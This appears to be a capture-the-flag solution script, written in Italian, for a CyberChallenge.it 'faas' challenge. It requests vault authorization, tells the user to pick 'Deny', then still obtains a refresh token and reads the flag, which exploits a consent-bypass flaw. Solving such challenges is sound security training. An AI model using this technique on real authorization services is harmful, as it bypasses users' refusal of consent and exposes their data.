
import os
import time
from faas import Faas

# Dati della challenge
host = "faas.challs.cyberchallenge.it"
app_id = "74be5421-b524-4b06-8ada-6c111324454b"  # App con flag
vault_id = "bdc3e1e0-fa24-48fe-9f96-3c5390dbd842"
KEY = "flag"
DEBUG = True

token_path = ".refresh_token_challenge"

def ask_auth():
    f = Faas(host, app_id, debug=DEBUG)
    wait_token = f.authorize()
    print(f"🔗 Vai su http://{host}/authorize/{app_id} per accettare o negare.")
    print("👉 Scegli 'Deny', poi premi INVIO qui.")
    input()
    return wait_token

def check_auth(wait_token):
    f = Faas(host, app_id, debug=DEBUG)
    f.wait_token = wait_token
    token = f.get_refresh_token()
    if token:
        print("✅ Refresh token ottenuto.")
        with open(token_path, "w") as f_token:
            f_token.write(token)
    else:
        print("❌ Autorizzazione fallita o negata.")

def get_token():
    if not os.path.exists(token_path):
        print("❌ Nessun token salvato.")
        return None
    with open(token_path) as f:
        return f.read().strip()

def get_key():
    token = get_token()
    if not token:
        print("❌ Nessun token.")
        return
    f = Faas(host, app_id, refresh_token=token, debug=DEBUG)
    f.get_auth_token()
    value = f.get(KEY)
    print(f"🏁 FLAG: {value}")

# Esecuzione automatica per test rapido:
if __name__ == "__main__":
    print("== FASE 1: Richiesta autorizzazione ==")
    wt = ask_auth()
    print("\n== FASE 2: Controllo autorizzazione ==")
    check_auth(wt)
    print("\n== FASE 3: Accesso al vault ==")
    get_key()
